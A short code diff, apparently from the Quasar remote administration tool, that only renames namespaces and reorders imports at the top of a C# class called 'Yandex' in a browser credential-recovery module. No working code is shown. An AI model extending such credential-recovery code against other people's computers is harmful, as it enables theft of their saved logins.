@@ -1,10 +1,10 @@
-﻿using Quasar.Common.Models;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.IO;
-using xClient.Core.Recovery.Utilities;
+using Quasar.Client.Core.Recovery.Utilities;
+using Quasar.Common.Models;
 
-namespace xClient.Core.Recovery.Browsers
+namespace Quasar.Client.Core.Recovery.Browsers
 {
     public class Yandex
     {
